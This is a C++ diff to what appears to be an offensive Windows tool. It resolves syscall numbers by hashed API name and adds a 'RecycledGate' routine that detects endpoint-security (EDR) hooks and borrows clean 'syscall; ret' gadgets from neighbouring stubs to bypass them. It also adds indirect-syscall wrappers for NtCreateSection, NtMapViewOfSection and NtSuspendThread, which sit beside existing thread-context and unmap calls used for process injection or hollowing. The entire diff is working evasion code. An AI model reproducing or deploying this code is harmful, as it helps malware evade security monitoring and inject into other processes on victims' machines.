@@ -40,21 +40,19 @@ namespace Sys {
         PVOID FindSyscallGadget(PVOID func) {
 #if defined(_M_X64)
             auto bytes = reinterpret_cast<uint8_t*>(func);
+            // Bail immediately if the stub is JMP-hooked at byte 0 (EDR hook)
+            if (bytes[0] == 0xE9) return nullptr;
             for (int i = 0; i < 64; ++i) {
-                if (bytes[i] == 0x0F && bytes[i + 1] == 0x05 && bytes[i + 2] == 0xC3) {
+                if (bytes[i] == 0x0F && bytes[i + 1] == 0x05 && bytes[i + 2] == 0xC3)
                     return bytes + i;
-                }
-                // Skip over JMP hooks
-                if (bytes[i] == 0xE9) i += 4;
             }
 #elif defined(_M_ARM64)
             auto bytes = reinterpret_cast<uint8_t*>(func);
             for (int i = 0; i <= 64; i += 4) {
                 uint32_t instr = *reinterpret_cast<uint32_t*>(bytes + i);
-                if ((instr & 0xFF000000) == 0xD4000000 && 
-                    *reinterpret_cast<uint32_t*>(bytes + i + 4) == 0xD65F03C0) {
+                if ((instr & 0xFF000000) == 0xD4000000 &&
+                    *reinterpret_cast<uint32_t*>(bytes + i + 4) == 0xD65F03C0)
                     return bytes + i;
-                }
             }
 #endif
             return nullptr;
@@ -87,6 +85,9 @@ namespace Sys {
         constexpr uint32_t H_ZwReadFile                = djb2_hash("ZwReadFile");
         constexpr uint32_t H_ZwQueryInformationFile    = djb2_hash("ZwQueryInformationFile");
         constexpr uint32_t H_ZwSetInformationFile      = djb2_hash("ZwSetInformationFile");
+        constexpr uint32_t H_ZwCreateSection           = djb2_hash("ZwCreateSection");
+        constexpr uint32_t H_ZwMapViewOfSection        = djb2_hash("ZwMapViewOfSection");
+        constexpr uint32_t H_ZwSuspendThread           = djb2_hash("ZwSuspendThread");
     }
 
     bool InitApi(bool) {
@@ -137,6 +138,9 @@ namespace Sys {
             {H_ZwTerminateProcess,        &g_syscall_stubs.NtTerminateProcess, 2},
             {H_ZwQueryInformationProcess, &g_syscall_stubs.NtQueryInformationProcess, 5},
             {H_ZwUnmapViewOfSection,      &g_syscall_stubs.NtUnmapViewOfSection, 2},
+            {H_ZwCreateSection,           &g_syscall_stubs.NtCreateSection, 7},
+            {H_ZwMapViewOfSection,        &g_syscall_stubs.NtMapViewOfSection, 10},
+            {H_ZwSuspendThread,           &g_syscall_stubs.NtSuspendThread, 2},
             {H_ZwGetContextThread,        &g_syscall_stubs.NtGetContextThread, 2},
             {H_ZwSetContextThread,        &g_syscall_stubs.NtSetContextThread, 2},
             {H_ZwResumeThread,            &g_syscall_stubs.NtResumeThread, 2},
@@ -153,20 +157,31 @@ namespace Sys {
             {H_ZwSetInformationFile,      &g_syscall_stubs.NtSetInformationFile, 5}
         };
 
-        // Match by hash and resolve SSN from sorted position
-        for (WORD i = 0; i < sortedSyscalls.size(); ++i) {
-            const auto& mapping = sortedSyscalls[i];
-            
+        // RecycledGate: match by hash, derive SSN from sorted position.
+        // If the stub is EDR-hooked (no syscall;ret gadget found), borrow the gadget
+        // from the nearest clean neighbor — SSN stays ours, gadget is theirs.
+        for (WORD i = 0; i < (WORD)sortedSyscalls.size(); ++i) {
             for (auto& target : targets) {
-                if (mapping.hash == target.hash) {
-                    PVOID gadget = FindSyscallGadget(mapping.address);
-                    if (gadget) {
-                        target.entry->pSyscallGadget = gadget;
-                        target.entry->ssn = i;
-                        target.entry->nArgs = target.argCount;
+                if (sortedSyscalls[i].hash != target.hash) continue;
+
+                PVOID gadget = FindSyscallGadget(sortedSyscalls[i].address);
+
+                if (!gadget) {
+                    // Hooked — scan up to 8 neighbors for a clean syscall;ret gadget
+                    for (int d = 1; d <= 8 && !gadget; ++d) {
+                        if (i + d < (WORD)sortedSyscalls.size())
+                            gadget = FindSyscallGadget(sortedSyscalls[i + d].address);
+                        if (!gadget && i >= (WORD)d)
+                            gadget = FindSyscallGadget(sortedSyscalls[i - d].address);
                     }
-                    break;
                 }
+
+                if (gadget) {
+                    target.entry->pSyscallGadget = gadget;
+                    target.entry->ssn            = i;
+                    target.entry->nArgs          = target.argCount;
+                }
+                break;
             }
         }
 
@@ -215,6 +230,15 @@ extern "C" {
     }
     NTSTATUS NtUnmapViewOfSection_syscall(HANDLE ProcessHandle, PVOID BaseAddress) {
         return SyscallTrampoline(&g_syscall_stubs.NtUnmapViewOfSection, ProcessHandle, BaseAddress);
+    }
+    NTSTATUS NtCreateSection_syscall(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
+        return SyscallTrampoline(&g_syscall_stubs.NtCreateSection, SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
+    }
+    NTSTATUS NtMapViewOfSection_syscall(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, ULONG InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
+        return SyscallTrampoline(&g_syscall_stubs.NtMapViewOfSection, SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
+    }
+    NTSTATUS NtSuspendThread_syscall(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
+        return SyscallTrampoline(&g_syscall_stubs.NtSuspendThread, ThreadHandle, PreviousSuspendCount);
     }
     NTSTATUS NtGetContextThread_syscall(HANDLE ThreadHandle, PCONTEXT pContext) {
         return SyscallTrampoline(&g_syscall_stubs.NtGetContextThread, ThreadHandle, pContext);
